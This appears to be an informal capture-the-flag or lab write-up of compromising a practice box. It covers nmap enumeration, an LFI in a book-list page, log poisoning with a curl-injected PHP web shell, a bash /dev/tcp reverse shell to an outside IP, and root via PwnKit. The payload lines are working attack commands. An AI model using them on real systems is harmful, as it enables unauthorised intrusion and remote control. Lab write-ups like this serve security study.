Started with a nmap scan
```
21 pyftpdlib 1.5.6
22 OpenSSH 7.9p1
25 Exim smtpd
80 Apache 2.4.38
2121 pyftpdlib 1.5.6
3128 squid http proxy 4.6
8593 PHP cli server
54787 PHP cli server
62524 Freefloat FTP 1.00
```
Checked both the FTP services and they don't allow anonymous login but one did `2121` and has a `pub` folder but we cant PUT any files on the FTP 
Checked all the webservers and only two had pages that loaded `80,54787` the one on  port `80` says the `database is being configured` and the other webhost just loads a blank page going to run a gobuster scan on them 
Webhost port `80`
```
/app
/javascript
/backup
```
Webserver port `54787`
```
/project
```
When going to `project` on the webhost we get a login page for something called `File Thingie` its a File manager but I cant seem to exploit this going back to the webhost on port `80` looking back at the source it says its powered by `phpIPAM 1.4` but the links to the login page for the SQL exploit all get `403` so now going to the webhost on port `8593` there is a page saying `still setting up the libaray` and it has two links on the page one for Main home page and one for a book list which is vulnerable to LFI `index.php?book=` looking at the `/etc/passwd` there is only two users `root,miguel` doing some testing with this we need to do some log poisoning so going to `/var/log/apache2/access.log` we can see the log file so if we run a curl with some PHP code we can get RCE `curl -A "<?php system (\$_GET['cmd']); ?>" http://192.168.211.72` and when we go to the LFI now we can run code on the host `/index.php?book=../../../../var/log/apache2/access.log&cmd=id` and viewing the log we see `www-data` now we need to get a reverse shell and we can use bash for this `bash -c 'bash -i >& /dev/tcp/192.168.45.158/8080 0>&1'`  and we need to url encode this and then run it and we got a call back as the `www-data` user as when seen in the log we can get the first flag and when doing some enumeration we seen we have the SUID bit set on the `apache.log.1` file and a the error file as well but its also vulnerable to PwnKit which is a lot easier running that exploit now we are root   